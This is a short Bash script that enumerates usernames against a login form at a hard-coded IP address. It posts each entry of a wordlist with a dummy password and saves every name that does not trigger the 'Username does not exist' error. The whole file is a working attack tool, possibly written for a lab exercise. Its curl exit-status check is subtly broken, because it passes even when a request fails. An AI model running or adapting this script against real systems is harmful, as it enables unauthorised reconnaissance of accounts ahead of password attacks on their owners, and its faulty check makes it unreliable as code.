#CONSTANTS
INVALID_USERNAME_REGEX="Error. Username does not exist."
OUTPUT_FILE="valid_usernames.txt"

#the first argument passed to the script is the dictionary that we will use as guesses
guesslist=$1

while IFS= read -r username #loop through guesslist
do
	#send a HTTP POST query to the website
	response="$(curl -X POST http://142.1.44.135:8000/login -d "username=${username}" -d "password=a")"
	
	#capture the exit status of the curl command (in case of internet disconnect and other unexpected situations)
	curl_success=$? 
	
	#apply regex to the result 
	if [[ ! "${response}" =~ "${INVALID_USERNAME_REGEX}" ]] && [ $curl_success ]; then
		#no match implies that the username valid, store it
		echo "${username}" >> "${OUTPUT_FILE}"
	fi

done < "${guesslist}" 
